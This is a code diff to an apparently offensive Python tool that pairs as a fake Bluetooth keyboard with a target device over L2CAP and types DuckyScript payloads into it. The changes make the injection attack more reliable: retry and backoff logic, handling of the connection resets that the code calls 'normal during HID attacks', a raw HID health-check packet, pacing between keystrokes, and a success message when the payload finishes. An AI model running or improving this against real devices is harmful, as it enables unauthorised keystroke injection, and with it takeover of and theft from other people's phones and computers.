@@ -7,6 +7,7 @@ import os
 
 from utils.menu_functions import (main_menu, read_duckyscript, run, restart_bluetooth_daemon, get_target_address)
 from utils.register_device import register_hid_profile, agent_loop
+from utils.bluetooth_tools import BluetoothManager
 
 child_processes = []
 
@@ -67,6 +68,7 @@ class Adapter:
         self.iface = iface
         self.bus = SystemBus()
         self.adapter = self._get_adapter(iface)
+        self.bluetooth_manager = BluetoothManager(iface)
 
     def _get_adapter(self, iface):
         try:
@@ -83,15 +85,15 @@ class Adapter:
     def set_property(self, prop, value):
         # Convert value to string if it's not
         value_str = str(value) if not isinstance(value, str) else value
-        command = ["sudo", "hciconfig", self.iface, prop, value_str]
-        self._run_command(command)
-
-        # Verify if the property is set correctly
-        verify_command = ["hciconfig", self.iface, prop]
-        verification_result = run(verify_command)
-        if value_str not in verification_result.stdout:
-            log.error(f"Unable to set adapter {prop}, aborting. Output: {verification_result.stdout}")
-            raise ConnectionFailureException(f"Failed to set {prop}")
+        
+        # Use the BluetoothManager to set the property
+        success, message = self.bluetooth_manager.set_property(prop, value_str)
+        
+        if not success:
+            log.error(f"Unable to set adapter {prop}, aborting. {message}")
+            raise ConnectionFailureException(f"Failed to set {prop}: {message}")
+        
+        log.info(f"Successfully set {prop} to {value_str}")
 
     def power(self, powered):
         self.adapter.Powered = powered
@@ -102,13 +104,14 @@ class Adapter:
 
     def enable_ssp(self):
         try:
-            # Command to enable SSP - the actual command might differ
-            # This is a placeholder command and should be replaced with the actual one.
-            ssp_command = ["sudo", "hciconfig", self.iface, "sspmode", "1"]
-            ssp_result = run(ssp_command)
-            if ssp_result.returncode != 0:
-                log.error(f"Failed to enable SSP: {ssp_result.stderr}")
-                raise ConnectionFailureException("Failed to enable SSP")
+            # Use the BluetoothManager to enable SSP
+            success, message = self.bluetooth_manager.enable_ssp()
+            
+            if not success:
+                log.error(f"Failed to enable SSP: {message}")
+                raise ConnectionFailureException(f"Failed to enable SSP: {message}")
+            
+            log.info(f"SSP enabled successfully: {message}")
         except Exception as e:
             log.error(f"Error enabling SSP: {e}")
             raise
@@ -201,7 +204,7 @@ class L2CAPClient:
         # Notify the main script or trigger a reconnection process
         raise ReconnectionRequiredException("Reconnection required")
 
-    def send(self, data):
+    def send(self, data, retry_count=0, max_retries=2):
         if not self.connected:
             log.error("[TX] Not connected")
             self.reconnect()
@@ -216,8 +219,28 @@ class L2CAPClient:
             log.debug(f"[TX-{self.port}] Data sent successfully")
         except bluetooth.btcommon.BluetoothError as ex:
             log.error(f"[TX-{self.port}] Bluetooth error: {ex}")
-            self.reconnect()
-            self.send(data)  # Retry sending after reconnection
+            
+            # Handle specific error codes
+            if ex.errno == 104:  # Connection reset by peer
+                log.warning(f"[TX-{self.port}] Connection reset by peer (errno 104). This is normal during HID attacks.")
+                if retry_count < max_retries:
+                    log.info(f"[TX-{self.port}] Attempting reconnection (attempt {retry_count + 1}/{max_retries})")
+                    time.sleep(1)  # Wait before reconnecting
+                    self.reconnect()
+                    return self.send(data, retry_count + 1, max_retries)
+                else:
+                    log.error(f"[TX-{self.port}] Max retries reached. Connection may be lost.")
+                    raise ReconnectionRequiredException(f"Connection lost after {max_retries} retries")
+            elif ex.errno == 107:  # Transport endpoint is not connected
+                log.warning(f"[TX-{self.port}] Transport endpoint not connected (errno 107)")
+                raise ReconnectionRequiredException("Transport endpoint disconnected")
+            else:
+                log.error(f"[TX-{self.port}] Unhandled Bluetooth error: {ex}")
+                if retry_count < max_retries:
+                    time.sleep(0.5)
+                    return self.send(data, retry_count + 1, max_retries)
+                else:
+                    raise
         except Exception as ex:
             log.error(f"[TX-{self.port}] Exception: {ex}")
             raise
@@ -232,6 +255,18 @@ class L2CAPClient:
                 if ex.errno != 11:  # no data available
                     raise
                 time.sleep(0.001)
+    
+    def is_connection_healthy(self):
+        """Check if the connection is still healthy."""
+        try:
+            if not self.connected or self.sock is None:
+                return False
+            # Try to send a small test packet
+            test_data = bytes([0xa1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+            self.sock.send(test_data)
+            return True
+        except:
+            return False
 
     def recv(self, timeout=0):
         start = time.time()
@@ -332,6 +367,9 @@ def process_duckyscript(client, duckyscript, current_line=0, current_position=0)
             log.info(f"Processing {line}")
             if not line or line.startswith("REM"):
                 continue
+            
+            # Add a small delay between commands to prevent overwhelming the target
+            time.sleep(0.1)
             if line.startswith("TAB"):
                 client.send_keypress(Key_Codes.TAB)
             if line.startswith("PRIVATE_BROWSER"):
@@ -723,20 +761,32 @@ def main():
     current_position = 0
     connection_manager = L2CAPConnectionManager(target_address)
 
-    while True:
+    max_reconnection_attempts = 3
+    reconnection_attempts = 0
+    
+    while reconnection_attempts < max_reconnection_attempts:
         try:
             hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
             process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
             time.sleep(2)
+            log.info("Payload execution completed successfully!")
             break  # Exit loop if successful
 
         except ReconnectionRequiredException as e:
-            log.info(f"{reset}Reconnection required. Attempting to reconnect{blue}...")
+            reconnection_attempts += 1
+            log.info(f"{reset}Reconnection required. Attempting to reconnect{blue}... (attempt {reconnection_attempts}/{max_reconnection_attempts})")
             current_line = e.current_line
             current_position = e.current_position
             connection_manager.close_all()
-            # Sleep before retrying to avoid rapid reconnection attempts
-            time.sleep(2)
+            
+            if reconnection_attempts < max_reconnection_attempts:
+                # Sleep before retrying to avoid rapid reconnection attempts
+                sleep_time = 2 + (reconnection_attempts * 2)  # Increasing delay
+                log.info(f"Waiting {sleep_time} seconds before reconnection attempt...")
+                time.sleep(sleep_time)
+            else:
+                log.error("Maximum reconnection attempts reached. Exiting.")
+                break
 
         finally:
             # unpair the target device
